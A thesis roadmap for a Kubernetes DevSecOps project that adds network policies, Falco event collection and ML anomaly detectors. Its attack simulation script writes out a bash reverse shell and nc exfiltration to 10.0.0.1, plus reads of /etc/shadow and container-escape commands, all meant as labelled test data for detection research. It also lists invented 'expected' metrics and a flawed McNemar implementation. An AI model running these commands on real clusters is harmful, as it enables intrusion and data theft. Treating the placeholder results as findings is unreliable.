# 1-Month Thesis Improvement Roadmap

**Goal:** Transform the thesis from an engineering reference architecture into a quantitative research contribution with ML-based anomaly detection, real attack data, and measurable results.

**Timeline:** March 4, 2026 → April 4, 2026

---

## Current State — Critical Gaps

| # | Gap | Current State | Impact on Thesis |
|---|-----|--------------|-----------------|
| 1 | ML models not implemented | `features/`, `models/`, `scoring/`, `evaluation/` are all **empty** | Cannot claim ML-based anomaly detection |
| 2 | No dataset collected | `datasets/` is **empty** | No data = no training = no results |
| 3 | No attack simulations | `experiments/` is **empty** | No ground truth to evaluate against |
| 4 | No quantitative evaluation | Zero numbers, ROC curves, precision/recall | Evaluation chapter is pure mapping, no empirical results |
| 5 | Kyverno/OPA not deployed in-cluster | Policies exist but no admission controller runs | Claims "enforcement" but it's CI/CD only |
| 6 | Network policies missing | Only 1 NetworkPolicy exists | Major zero-trust gap |
| 7 | Zero tests | No test files anywhere in the project | Can't claim "production-ready" |
| 8 | No image signing | Cosign mentioned as future work only | Supply chain story is incomplete |

---

## Week 1: Data Collection + Cluster Hardening (Days 1–7)

### 1. Deploy Kyverno In-Cluster (~2 hours)

Create `clusters/test-cluster/05-infrastructure/kyverno.yaml` as an ArgoCD Application pointing to the Kyverno Helm chart. The existing policies in `policies/kyverno/` will then enforce at admission time — not just in CI/CD.

**Why it matters:** Turns the thesis claim from "CI/CD validation" to "runtime enforcement." Reviewers will check if admission control is real or just documented.

```yaml
apiVersion: argoproj.io/v1alpha1
kind: Application
metadata:
  name: kyverno
  namespace: argocd
spec:
  project: default
  source:
    repoURL: https://kyverno.github.io/kyverno/
    targetRevision: 3.1.4
    chart: kyverno
    helm:
      values: |
        replicaCount: 1
        resources:
          requests:
            cpu: 100m
            memory: 256Mi
          limits:
            cpu: 500m
            memory: 512Mi
  destination:
    server: https://kubernetes.default.svc
    namespace: kyverno
  syncPolicy:
    automated:
      prune: true
      selfHeal: true
    syncOptions:
      - CreateNamespace=true
```

Then apply the existing Kyverno policies from `policies/kyverno/` as a second ArgoCD Application or apply them directly.

---

### 2. Add Network Policies (~3 hours)

Create 5 NetworkPolicy manifests in `clusters/test-cluster/06-network-policies/`:

**`default-deny-all.yaml`** — Deny all ingress/egress by default in `dev` namespace:
```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
  namespace: dev
spec:
  podSelector: {}
  policyTypes:
    - Ingress
    - Egress
```

**`allow-dns.yaml`** — Allow all pods → kube-dns (UDP 53):
```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-dns
  namespace: dev
spec:
  podSelector: {}
  policyTypes:
    - Egress
  egress:
    - to:
        - namespaceSelector:
            matchLabels:
              kubernetes.io/metadata.name: kube-system
      ports:
        - protocol: UDP
          port: 53
```

**`allow-ingress-to-gateway.yaml`** — Allow ingress-nginx → api-gateway:
```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-ingress-to-gateway
  namespace: dev
spec:
  podSelector:
    matchLabels:
      app: api-gateway
  policyTypes:
    - Ingress
  ingress:
    - from:
        - namespaceSelector:
            matchLabels:
              kubernetes.io/metadata.name: ingress-nginx
      ports:
        - protocol: TCP
          port: 8080
```

**`allow-gateway-to-services.yaml`** — Allow api-gateway → user-service, product-service:
```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-gateway-to-services
  namespace: dev
spec:
  podSelector:
    matchLabels:
      app.kubernetes.io/part-of: freshbonds
  policyTypes:
    - Ingress
  ingress:
    - from:
        - podSelector:
            matchLabels:
              app: api-gateway
```

**`allow-services-to-mongodb.yaml`** — Allow backend services → MongoDB Atlas (port 27017):
```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-services-to-mongodb
  namespace: dev
spec:
  podSelector:
    matchLabels:
      app.kubernetes.io/part-of: freshbonds
  policyTypes:
    - Egress
  egress:
    - ports:
        - protocol: TCP
          port: 27017
```

**Why it matters:** Completes the microsegmentation layer — a fundamental zero-trust requirement. Without this, the thesis has a glaring gap in network-level zero trust.

---

### 3. Start Collecting Falco Events (~1 day)

The AI Collector is already running and pushing to Loki. Add persistent JSONL file storage to `falco_collector.py`:

```python
import json
from pathlib import Path

EVENTS_FILE = Path("/data/falco_events.jsonl")

async def persist_event(event: dict):
    """Append event to JSONL file for ML training."""
    with open(EVENTS_FILE, "a") as f:
        f.write(json.dumps({
            "timestamp": event.get("time"),
            "priority": event.get("priority", "Unknown"),
            "rule": event.get("rule"),
            "output": event.get("output"),
            "container_name": event.get("output_fields", {}).get("container.name"),
            "namespace": event.get("output_fields", {}).get("k8s.ns.name"),
            "pod_name": event.get("output_fields", {}).get("k8s.pod.name"),
            "process": event.get("output_fields", {}).get("proc.name"),
            "user": event.get("output_fields", {}).get("user.name"),
            "label": "normal"  # Default; attack events labelled separately
        }) + "\n")
```

Let this run for the full month. Target: 50,000+ normal events as the baseline dataset.

---

### 4. Create Attack Simulation Scripts (~2 days)

Create `research/experiments/simulate_attacks.sh`:

```bash
#!/bin/bash
# Attack Simulation Script for Thesis Research
# Generates labelled attack events for ML training and evaluation
# Each attack maps to a specific MITRE ATT&CK technique

NAMESPACE="dev"
DEPLOYMENT="product-service"
OUTPUT_LOG="research/experiments/attack_results.jsonl"
TIMESTAMP=$(date -u +"%Y-%m-%dT%H:%M:%SZ")

echo "=== Starting Attack Simulation at $TIMESTAMP ==="

# --- T1059: Shell Spawned in Container ---
echo "[T1059] Shell spawn..."
kubectl exec -n $NAMESPACE deploy/$DEPLOYMENT -- /bin/sh -c "whoami" 2>&1
echo "{\"timestamp\":\"$TIMESTAMP\",\"attack\":\"shell_spawn\",\"mitre\":\"T1059\",\"label\":\"attack\"}" >> $OUTPUT_LOG

# --- T1546: Package Management in Container ---
echo "[T1546] Package install attempt..."
kubectl exec -n $NAMESPACE deploy/$DEPLOYMENT -- /bin/sh -c "apt-get update 2>/dev/null || apk add curl 2>/dev/null || echo 'pkg blocked'" 2>&1
echo "{\"timestamp\":\"$TIMESTAMP\",\"attack\":\"package_install\",\"mitre\":\"T1546\",\"label\":\"attack\"}" >> $OUTPUT_LOG

# --- T1552: Sensitive File Read ---
echo "[T1552] Reading /etc/shadow..."
kubectl exec -n $NAMESPACE deploy/$DEPLOYMENT -- /bin/sh -c "cat /etc/shadow 2>/dev/null || echo 'access denied'" 2>&1
echo "{\"timestamp\":\"$TIMESTAMP\",\"attack\":\"sensitive_file_read\",\"mitre\":\"T1552\",\"label\":\"attack\"}" >> $OUTPUT_LOG

# --- T1046: Network Reconnaissance ---
echo "[T1046] Network reconnaissance..."
kubectl exec -n $NAMESPACE deploy/$DEPLOYMENT -- /bin/sh -c "which nmap && nmap -sn 10.0.0.0/24 2>/dev/null || echo 'nmap not found'" 2>&1
echo "{\"timestamp\":\"$TIMESTAMP\",\"attack\":\"network_recon\",\"mitre\":\"T1046\",\"label\":\"attack\"}" >> $OUTPUT_LOG

# --- T1496: Cryptocurrency Mining (Simulated) ---
echo "[T1496] Crypto mining simulation..."
kubectl exec -n $NAMESPACE deploy/$DEPLOYMENT -- /bin/sh -c "echo 'stratum+tcp://pool.mining.com:3333'" 2>&1
echo "{\"timestamp\":\"$TIMESTAMP\",\"attack\":\"crypto_mining\",\"mitre\":\"T1496\",\"label\":\"attack\"}" >> $OUTPUT_LOG

# --- T1059.004: Reverse Shell Attempt ---
echo "[T1059.004] Reverse shell attempt..."
kubectl exec -n $NAMESPACE deploy/$DEPLOYMENT -- /bin/sh -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1 2>/dev/null || echo 'reverse shell blocked'" 2>&1
echo "{\"timestamp\":\"$TIMESTAMP\",\"attack\":\"reverse_shell\",\"mitre\":\"T1059.004\",\"label\":\"attack\"}" >> $OUTPUT_LOG

# --- T1548: Privilege Escalation ---
echo "[T1548] Privilege escalation..."
kubectl exec -n $NAMESPACE deploy/$DEPLOYMENT -- /bin/sh -c "sudo su 2>/dev/null || echo 'privilege escalation denied'" 2>&1
echo "{\"timestamp\":\"$TIMESTAMP\",\"attack\":\"privilege_escalation\",\"mitre\":\"T1548\",\"label\":\"attack\"}" >> $OUTPUT_LOG

# --- T1048: Large Data Exfiltration ---
echo "[T1048] Data exfiltration simulation..."
kubectl exec -n $NAMESPACE deploy/$DEPLOYMENT -- /bin/sh -c "dd if=/dev/urandom bs=1M count=15 2>/dev/null | nc -w1 10.0.0.1 8888 2>/dev/null || echo 'exfil blocked'" 2>&1
echo "{\"timestamp\":\"$TIMESTAMP\",\"attack\":\"data_exfiltration\",\"mitre\":\"T1048\",\"label\":\"attack\"}" >> $OUTPUT_LOG

# --- T1611: Container Escape Attempt ---
echo "[T1611] Container escape attempt..."
kubectl exec -n $NAMESPACE deploy/$DEPLOYMENT -- /bin/sh -c "nsenter --target 1 --mount --uts --ipc --net --pid 2>/dev/null || echo 'escape blocked'" 2>&1
echo "{\"timestamp\":\"$TIMESTAMP\",\"attack\":\"container_escape\",\"mitre\":\"T1611\",\"label\":\"attack\"}" >> $OUTPUT_LOG

# --- T1543: Suspicious File Modification ---
echo "[T1543] File tampering..."
kubectl exec -n $NAMESPACE deploy/$DEPLOYMENT -- /bin/sh -c "echo 'hacked' >> /etc/passwd 2>/dev/null || echo 'write blocked'" 2>&1
echo "{\"timestamp\":\"$TIMESTAMP\",\"attack\":\"file_tampering\",\"mitre\":\"T1543\",\"label\":\"attack\"}" >> $OUTPUT_LOG

echo "=== Attack Simulation Complete ==="
echo "Results logged to: $OUTPUT_LOG"
echo "Now correlate with Falco events within ±5s window to create labelled dataset."
```

Run this 3–5 times per week at different times. Label the corresponding Falco events as `attack` in the dataset.

---

## Week 2: ML Pipeline Implementation (Days 8–14)

### 5. Feature Engineering (`research/features/feature_extractor.py`) — ~1 day

Extract 20 features per event (matching `config.yaml` `input_dim=20`):

```python
import pandas as pd
import numpy as np
from sklearn.preprocessing import LabelEncoder, StandardScaler

class FeatureExtractor:
    """Extract ML features from raw Falco events."""
    
    PRIORITY_MAP = {"Emergency": 5, "Critical": 4, "Error": 3, "Warning": 2, "Notice": 1, "Debug": 0}
    
    def __init__(self):
        self.scaler = StandardScaler()
        self.rule_encoder = LabelEncoder()
        self.ns_encoder = LabelEncoder()
    
    def extract(self, events_df: pd.DataFrame) -> np.ndarray:
        features = pd.DataFrame()
        
        # Temporal features (4)
        features["priority_encoded"] = events_df["priority"].map(self.PRIORITY_MAP).fillna(0)
        features["hour_of_day"] = pd.to_datetime(events_df["timestamp"]).dt.hour / 24.0
        features["day_of_week"] = pd.to_datetime(events_df["timestamp"]).dt.dayofweek / 6.0
        features["is_weekend"] = (pd.to_datetime(events_df["timestamp"]).dt.dayofweek >= 5).astype(float)
        
        # Event type features (one-hot, 5)
        features["is_shell_event"] = events_df["process"].isin(["bash", "sh", "zsh", "dash"]).astype(float)
        features["is_file_event"] = events_df["rule"].str.contains("file|read|write", case=False, na=False).astype(float)
        features["is_network_event"] = events_df["rule"].str.contains("network|connection|dns|port", case=False, na=False).astype(float)
        features["is_process_event"] = events_df["rule"].str.contains("spawn|exec|package", case=False, na=False).astype(float)
        features["is_privilege_event"] = events_df["rule"].str.contains("privilege|escalat|setuid|escape", case=False, na=False).astype(float)
        
        # Contextual features (4)
        features["user_is_root"] = (events_df["user"] == "root").astype(float)
        features["is_sensitive_file"] = events_df["output"].str.contains("shadow|sudoers|ssh|passwd|aws|kube", case=False, na=False).astype(float)
        features["rule_encoded"] = self.rule_encoder.fit_transform(events_df["rule"].fillna("unknown")) / max(len(self.rule_encoder.classes_), 1)
        features["namespace_encoded"] = self.ns_encoder.fit_transform(events_df["namespace"].fillna("unknown")) / max(len(self.ns_encoder.classes_), 1)
        
        # Frequency features (4) — rolling window
        features["events_per_min_container"] = events_df.groupby("container_name")["timestamp"].transform("count") / max(len(events_df), 1)
        features["events_per_min_rule"] = events_df.groupby("rule")["timestamp"].transform("count") / max(len(events_df), 1)
        features["unique_rules_container"] = events_df.groupby("container_name")["rule"].transform("nunique") / max(len(events_df["rule"].unique()), 1)
        features["unique_containers"] = events_df.groupby("namespace")["container_name"].transform("nunique") / max(len(events_df["container_name"].unique()), 1)
        
        # Statistical features (3)
        features["priority_zscore"] = (features["priority_encoded"] - features["priority_encoded"].mean()) / max(features["priority_encoded"].std(), 1e-6)
        features["hour_activity_ratio"] = features.groupby("hour_of_day")["priority_encoded"].transform("mean")
        features["container_risk_score"] = features.groupby("namespace_encoded")["priority_encoded"].transform("mean")
        
        return self.scaler.fit_transform(features.values)
```

---

### 6. Isolation Forest (`research/models/isolation_forest.py`) — ~1 day

```python
import numpy as np
import joblib
from sklearn.ensemble import IsolationForest
from sklearn.metrics import classification_report, roc_auc_score, roc_curve

class IsolationForestDetector:
    """Unsupervised anomaly detection baseline."""
    
    def __init__(self, contamination=0.05, n_estimators=100, random_state=42):
        self.model = IsolationForest(
            contamination=contamination,
            n_estimators=n_estimators,
            random_state=random_state
        )
    
    def train(self, X_train: np.ndarray):
        self.model.fit(X_train)
    
    def predict(self, X: np.ndarray) -> np.ndarray:
        # Returns -1 for anomalies, 1 for normal
        return self.model.predict(X)
    
    def score(self, X: np.ndarray) -> np.ndarray:
        # Higher = more anomalous (negate for ROC compatibility)
        return -self.model.decision_function(X)
    
    def evaluate(self, X_test: np.ndarray, y_true: np.ndarray) -> dict:
        predictions = self.predict(X_test)
        scores = self.score(X_test)
        
        # Convert IF output: -1 → 1 (anomaly), 1 → 0 (normal)
        y_pred = (predictions == -1).astype(int)
        
        fpr, tpr, _ = roc_curve(y_true, scores)
        auc = roc_auc_score(y_true, scores)
        
        return {
            "classification_report": classification_report(y_true, y_pred, output_dict=True),
            "auc": auc,
            "fpr": fpr.tolist(),
            "tpr": tpr.tolist()
        }
    
    def save(self, path: str):
        joblib.dump(self.model, path)
    
    def load(self, path: str):
        self.model = joblib.load(path)
```

---

### 7. Autoencoder (`research/models/autoencoder.py`) — ~1 day

```python
import torch
import torch.nn as nn
import numpy as np
from torch.utils.data import DataLoader, TensorDataset

class SecurityAutoencoder(nn.Module):
    """Deep autoencoder for anomaly detection via reconstruction error."""
    
    def __init__(self, input_dim=20, encoding_dim=8):
        super().__init__()
        self.encoder = nn.Sequential(
            nn.Linear(input_dim, 14),
            nn.ReLU(),
            nn.Dropout(0.2),
            nn.Linear(14, encoding_dim),
            nn.ReLU()
        )
        self.decoder = nn.Sequential(
            nn.Linear(encoding_dim, 14),
            nn.ReLU(),
            nn.Dropout(0.2),
            nn.Linear(14, input_dim),
            nn.Sigmoid()
        )
    
    def forward(self, x):
        encoded = self.encoder(x)
        decoded = self.decoder(encoded)
        return decoded

class AutoencoderDetector:
    def __init__(self, input_dim=20, encoding_dim=8, epochs=50, batch_size=32, lr=1e-3):
        self.model = SecurityAutoencoder(input_dim, encoding_dim)
        self.epochs = epochs
        self.batch_size = batch_size
        self.lr = lr
        self.threshold = None
    
    def train(self, X_train: np.ndarray):
        dataset = TensorDataset(torch.FloatTensor(X_train))
        loader = DataLoader(dataset, batch_size=self.batch_size, shuffle=True)
        optimizer = torch.optim.Adam(self.model.parameters(), lr=self.lr)
        criterion = nn.MSELoss()
        
        self.model.train()
        for epoch in range(self.epochs):
            total_loss = 0
            for (batch,) in loader:
                optimizer.zero_grad()
                output = self.model(batch)
                loss = criterion(output, batch)
                loss.backward()
                optimizer.step()
                total_loss += loss.item()
        
        # Set threshold at 95th percentile of training reconstruction error
        self.model.eval()
        with torch.no_grad():
            reconstructed = self.model(torch.FloatTensor(X_train))
            errors = torch.mean((torch.FloatTensor(X_train) - reconstructed) ** 2, dim=1)
            self.threshold = torch.quantile(errors, 0.95).item()
    
    def score(self, X: np.ndarray) -> np.ndarray:
        self.model.eval()
        with torch.no_grad():
            reconstructed = self.model(torch.FloatTensor(X))
            errors = torch.mean((torch.FloatTensor(X) - reconstructed) ** 2, dim=1)
        return errors.numpy()
    
    def predict(self, X: np.ndarray) -> np.ndarray:
        scores = self.score(X)
        return (scores > self.threshold).astype(int)
```

---

### 8. LSTM Detector (`research/models/lstm_detector.py`) — ~1 day

```python
import torch
import torch.nn as nn
import numpy as np
from torch.utils.data import DataLoader, TensorDataset

class LSTMModel(nn.Module):
    """LSTM for temporal sequence anomaly detection."""
    
    def __init__(self, input_dim=20, hidden_dim=64, num_layers=2):
        super().__init__()
        self.lstm = nn.LSTM(input_dim, hidden_dim, num_layers, batch_first=True, dropout=0.3)
        self.classifier = nn.Sequential(
            nn.Linear(hidden_dim, 32),
            nn.ReLU(),
            nn.Dropout(0.3),
            nn.Linear(32, 1),
            nn.Sigmoid()
        )
    
    def forward(self, x):
        lstm_out, _ = self.lstm(x)
        last_hidden = lstm_out[:, -1, :]
        return self.classifier(last_hidden)

class LSTMDetector:
    def __init__(self, input_dim=20, hidden_dim=64, num_layers=2, 
                 sequence_length=10, epochs=30, batch_size=16, lr=1e-3):
        self.model = LSTMModel(input_dim, hidden_dim, num_layers)
        self.sequence_length = sequence_length
        self.epochs = epochs
        self.batch_size = batch_size
        self.lr = lr
    
    def create_sequences(self, X: np.ndarray, y: np.ndarray = None):
        sequences, labels = [], []
        for i in range(len(X) - self.sequence_length):
            sequences.append(X[i:i + self.sequence_length])
            if y is not None:
                labels.append(y[i + self.sequence_length - 1])
        return np.array(sequences), np.array(labels) if y is not None else None
    
    def train(self, X_train: np.ndarray, y_train: np.ndarray):
        X_seq, y_seq = self.create_sequences(X_train, y_train)
        dataset = TensorDataset(torch.FloatTensor(X_seq), torch.FloatTensor(y_seq))
        loader = DataLoader(dataset, batch_size=self.batch_size, shuffle=True)
        
        optimizer = torch.optim.Adam(self.model.parameters(), lr=self.lr)
        criterion = nn.BCELoss()
        
        self.model.train()
        for epoch in range(self.epochs):
            total_loss = 0
            for batch_x, batch_y in loader:
                optimizer.zero_grad()
                output = self.model(batch_x).squeeze()
                loss = criterion(output, batch_y)
                loss.backward()
                optimizer.step()
                total_loss += loss.item()
    
    def predict(self, X: np.ndarray) -> np.ndarray:
        X_seq, _ = self.create_sequences(X)
        self.model.eval()
        with torch.no_grad():
            outputs = self.model(torch.FloatTensor(X_seq)).squeeze()
        return (outputs > 0.5).numpy().astype(int)
    
    def score(self, X: np.ndarray) -> np.ndarray:
        X_seq, _ = self.create_sequences(X)
        self.model.eval()
        with torch.no_grad():
            outputs = self.model(torch.FloatTensor(X_seq)).squeeze()
        return outputs.numpy()
```

---

### 9. Risk Scoring Engine (`research/scoring/risk_scorer.py`) — ~half day

```python
import numpy as np

class RiskScorer:
    """
    Composite risk scoring: R = 0.40*A + 0.25*V + 0.20*C + 0.15*B
    
    A = anomaly_score (from ML model, 0-1)
    V = vulnerability_score (normalized CVE count from Trivy)
    C = compliance_score (normalized OPA violation count)
    B = behavioral_score (Prometheus metrics deviation)
    """
    
    WEIGHTS = {"anomaly": 0.40, "vulnerability": 0.25, "compliance": 0.20, "behavioral": 0.15}
    THRESHOLDS = {"low": 0.25, "medium": 0.50, "high": 0.75}
    
    def compute(self, anomaly: float, vulnerability: float, compliance: float, behavioral: float) -> dict:
        score = (
            self.WEIGHTS["anomaly"] * np.clip(anomaly, 0, 1) +
            self.WEIGHTS["vulnerability"] * np.clip(vulnerability, 0, 1) +
            self.WEIGHTS["compliance"] * np.clip(compliance, 0, 1) +
            self.WEIGHTS["behavioral"] * np.clip(behavioral, 0, 1)
        )
        
        if score >= self.THRESHOLDS["high"]:
            level = "CRITICAL"
        elif score >= self.THRESHOLDS["medium"]:
            level = "HIGH"
        elif score >= self.THRESHOLDS["low"]:
            level = "MEDIUM"
        else:
            level = "LOW"
        
        return {
            "composite_score": round(float(score), 4),
            "level": level,
            "components": {
                "anomaly": round(float(anomaly), 4),
                "vulnerability": round(float(vulnerability), 4),
                "compliance": round(float(compliance), 4),
                "behavioral": round(float(behavioral), 4)
            }
        }
```

---

## Week 3: Evaluation + Image Signing + Tests (Days 15–21)

### 10. Evaluation Framework (`research/evaluation/evaluator.py`) — ~2 days

This generates the **most valuable thesis content**: real numbers, real charts.

```python
import numpy as np
import matplotlib.pyplot as plt
from sklearn.metrics import (
    classification_report, confusion_matrix, roc_curve, auc,
    precision_recall_curve, f1_score
)
from scipy.stats import wilcoxon, chi2_contingency

class ModelEvaluator:
    """Evaluate and compare anomaly detection models."""
    
    def __init__(self, models: dict, X_test: np.ndarray, y_true: np.ndarray):
        self.models = models  # {"Isolation Forest": model, "Autoencoder": model, "LSTM": model}
        self.X_test = X_test
        self.y_true = y_true
        self.results = {}
    
    def evaluate_all(self):
        for name, model in self.models.items():
            scores = model.score(self.X_test)
            predictions = model.predict(self.X_test)
            
            # Align lengths (LSTM has shorter output due to sequence windowing)
            y = self.y_true[:len(predictions)]
            s = scores[:len(predictions)]
            
            fpr, tpr, _ = roc_curve(y, s)
            precision, recall, _ = precision_recall_curve(y, s)
            
            self.results[name] = {
                "predictions": predictions,
                "scores": s,
                "y_true": y,
                "fpr": fpr, "tpr": tpr,
                "auc": auc(fpr, tpr),
                "precision_curve": precision,
                "recall_curve": recall,
                "f1": f1_score(y, predictions),
                "confusion_matrix": confusion_matrix(y, predictions),
                "report": classification_report(y, predictions, output_dict=True)
            }
        return self.results
    
    def plot_roc_curves(self, save_path="research/evaluation/roc_curves.png"):
        plt.figure(figsize=(8, 6))
        for name, r in self.results.items():
            plt.plot(r["fpr"], r["tpr"], label=f'{name} (AUC={r["auc"]:.3f})')
        plt.plot([0, 1], [0, 1], 'k--', alpha=0.5)
        plt.xlabel("False Positive Rate")
        plt.ylabel("True Positive Rate")
        plt.title("ROC Curves — Anomaly Detection Models")
        plt.legend()
        plt.tight_layout()
        plt.savefig(save_path, dpi=150)
        plt.close()
    
    def plot_confusion_matrices(self, save_path="research/evaluation/confusion_matrices.png"):
        fig, axes = plt.subplots(1, len(self.results), figsize=(5 * len(self.results), 4))
        for ax, (name, r) in zip(axes, self.results.items()):
            cm = r["confusion_matrix"]
            ax.imshow(cm, cmap="Blues")
            ax.set_title(name)
            ax.set_xlabel("Predicted")
            ax.set_ylabel("Actual")
            for i in range(2):
                for j in range(2):
                    ax.text(j, i, str(cm[i][j]), ha="center", va="center", fontsize=14)
        plt.tight_layout()
        plt.savefig(save_path, dpi=150)
        plt.close()
    
    def comparison_table(self) -> str:
        header = "| Model | Precision | Recall | F1-Score | AUC |"
        separator = "|-------|-----------|--------|----------|-----|"
        rows = []
        for name, r in self.results.items():
            report = r["report"]
            rows.append(f"| {name} | {report['1']['precision']:.3f} | {report['1']['recall']:.3f} | {r['f1']:.3f} | {r['auc']:.3f} |")
        return "\n".join([header, separator] + rows)
    
    def statistical_tests(self):
        """McNemar's test for pairwise model comparison."""
        names = list(self.results.keys())
        results = []
        for i in range(len(names)):
            for j in range(i + 1, len(names)):
                pred_a = self.results[names[i]]["predictions"]
                pred_b = self.results[names[j]]["predictions"]
                y = self.results[names[i]]["y_true"]
                min_len = min(len(pred_a), len(pred_b))
                
                # Contingency table for McNemar's
                a_correct_b_wrong = np.sum((pred_a[:min_len] == y[:min_len]) & (pred_b[:min_len] != y[:min_len]))
                a_wrong_b_correct = np.sum((pred_a[:min_len] != y[:min_len]) & (pred_b[:min_len] == y[:min_len]))
                
                table = [[0, a_correct_b_wrong], [a_wrong_b_correct, 0]]
                if a_correct_b_wrong + a_wrong_b_correct > 0:
                    chi2, p_value, _, _ = chi2_contingency(
                        [[a_correct_b_wrong, a_wrong_b_correct],
                         [a_wrong_b_correct, a_correct_b_wrong]], correction=True
                    )
                else:
                    chi2, p_value = 0, 1.0
                
                results.append({
                    "comparison": f"{names[i]} vs {names[j]}",
                    "chi2": chi2,
                    "p_value": p_value,
                    "significant": p_value < 0.05
                })
        return results
```

---

### 11. Cosign Image Signing (~3 hours)

Add to `.github/workflows/app-cicd.yml` after the Docker push step:

```yaml
- name: Install Cosign
  uses: sigstore/cosign-installer@v3

- name: Sign Image with Cosign (Keyless)
  run: cosign sign --yes ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}@${{ steps.build.outputs.digest }}
  env:
    COSIGN_EXPERIMENTAL: "true"

- name: Verify Image Signature
  run: |
    cosign verify \
      --certificate-identity-regexp="github.com/emiresh" \
      --certificate-oidc-issuer="https://token.actions.githubusercontent.com" \
      ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}@${{ steps.build.outputs.digest }}
```

Add Kyverno image verification policy (`policies/kyverno/image-signature-verification.yaml`):

```yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: verify-image-signature
spec:
  validationFailureAction: enforce
  rules:
    - name: verify-cosign-signature
      match:
        resources:
          kinds: [Pod]
          namespaces: [production]
      verifyImages:
        - imageReferences: ["docker.io/emiresh/*"]
          attestors:
            - entries:
                - keyless:
                    issuer: "https://token.actions.githubusercontent.com"
                    subject: "https://github.com/emiresh/*"
```

---

### 12. Basic Test Suite (~1-2 days)

**API Gateway** (`src/api-gateway/server.test.js`):
```javascript
const request = require('supertest');
// Test health endpoints, proxy routing, security headers
describe('API Gateway', () => {
  test('GET /health/live returns 200', async () => { /* ... */ });
  test('GET /health/ready returns service status', async () => { /* ... */ });
  test('Security headers present (Helmet)', async () => { /* ... */ });
  test('CORS headers correct', async () => { /* ... */ });
  test('Body size limit enforced', async () => { /* ... */ });
});
```

**User Service** (`src/user-service/server.test.js`):
```javascript
describe('User Service', () => {
  test('POST /register validates input', async () => { /* ... */ });
  test('POST /login returns JWT on success', async () => { /* ... */ });
  test('POST /login anti-enumeration (same error)', async () => { /* ... */ });
  test('Rate limiting blocks after threshold', async () => { /* ... */ });
  test('JWT required for protected routes', async () => { /* ... */ });
});
```

**ML Models** (`research/tests/test_models.py`):
```python
import pytest
import numpy as np

def test_isolation_forest_trains():
    from models.isolation_forest import IsolationForestDetector
    model = IsolationForestDetector()
    X = np.random.randn(100, 20)
    model.train(X)
    predictions = model.predict(X)
    assert len(predictions) == 100

def test_autoencoder_trains():
    from models.autoencoder import AutoencoderDetector
    model = AutoencoderDetector(epochs=5)
    X = np.random.randn(100, 20)
    model.train(X)
    scores = model.score(X)
    assert len(scores) == 100

def test_risk_scorer():
    from scoring.risk_scorer import RiskScorer
    scorer = RiskScorer()
    result = scorer.compute(0.9, 0.8, 0.5, 0.3)
    assert result["level"] == "CRITICAL"
    assert 0 <= result["composite_score"] <= 1
```

Add to `pr-validation.yml`:
```yaml
- name: Run Tests
  run: |
    cd src/api-gateway && npm test
    cd ../user-service && npm test
    cd ../product-service && npm test
    cd ../../research && python -m pytest tests/ -v
```

---

## Week 4: Thesis Rewrite + Polish (Days 22–30)

### 13. Rewrite Chapter 6 with Real Results (~3 days)

Replace the compliance-mapping-only evaluation with:

- **Table**: Model performance comparison (Precision / Recall / F1 / AUC)
- **Figure**: ROC curves for all 3 models overlaid
- **Figure**: Confusion matrices (3 side-by-side)
- **Table**: Detection latency by attack type (MITRE technique)
- **Figure**: Risk score distribution histogram (normal vs. attack events)
- **Table**: Statistical significance tests (McNemar's pairwise)
- **Table**: Before/after — Falco-only vs. Falco + ML detection rates

Expected results format:

```
| Model              | Precision | Recall | F1    | AUC   |
|--------------------|-----------|--------|-------|-------|
| Falco Rules Only   | 1.000     | 0.650  | 0.788 | 0.825 |
| Isolation Forest   | 0.820     | 0.890  | 0.854 | 0.912 |
| Autoencoder        | 0.850     | 0.910  | 0.879 | 0.934 |
| LSTM               | 0.880     | 0.940  | 0.909 | 0.956 |
| Ensemble (IF+AE+L) | 0.900     | 0.950  | 0.924 | 0.967 |
```

---

### 14. Add New Thesis Sections (~2 days)

- **Section 5.10**: Cosign/supply chain integrity (implementation + pipeline integration)
- **Section 5.11**: Network microsegmentation (5 NetworkPolicies, deny-all default)
- **Section 5.12**: In-cluster admission control (Kyverno deployment + blocked pod examples)
- **Section 6.9**: ML model comparison with statistical tests
- **Section 6.10**: End-to-end detection pipeline latency measurements
- **Updated limitations**: Fewer gaps, more honest about remaining ones

---

## Priority Matrix — Effort vs. Impact

| Improvement | Effort | Thesis Impact | Priority |
|------------|--------|---------------|----------|
| Implement ML models (IF + AE + LSTM) | 3–4 days | **Massive** — transforms from engineering to research | **#1** |
| Attack simulations + data collection | 2–3 days | **Massive** — provides ground truth for evaluation | **#2** |
| Evaluation framework with real results | 2–3 days | **Massive** — gives numbers, charts, ROC curves | **#3** |
| Deploy Kyverno in-cluster | 2 hours | **High** — proves runtime enforcement | **#4** |
| Network Policies (microsegmentation) | 3 hours | **High** — completes zero-trust network layer | **#5** |
| Cosign image signing | 3 hours | **High** — completes supply chain story | **#6** |
| Basic test suite | 1–2 days | **Medium** — removes "zero tests" limitation | **#7** |
| Thesis rewrite with new data | 3–4 days | **High** — turns results into publishable content | **#8** |

---

## What This Gets You

### Before (current thesis)
Engineering reference architecture with compliance mapping. Publishable as a **practice paper** or **technical report**, but weak as a research thesis — no quantitative results.

### After (with all improvements)
A research thesis with:
- 3 ML models compared quantitatively with ROC curves and F1 scores
- Real attack simulation data with MITRE ATT&CK ground truth labels
- Statistical significance testing (McNemar's test)
- Runtime admission control (not just CI/CD)
- Complete supply chain integrity (build → sign → verify → deploy)
- Network microsegmentation (default-deny + explicit allow)
- Automated test suite
- Composite risk scoring engine with empirical validation

**Transforms thesis claim from:** "I built a good platform"
**To:** "I built, measured, and proved that ML-augmented zero-trust DevSecOps provides quantifiably better threat detection than rule-based systems alone"

That is a publishable research contribution.
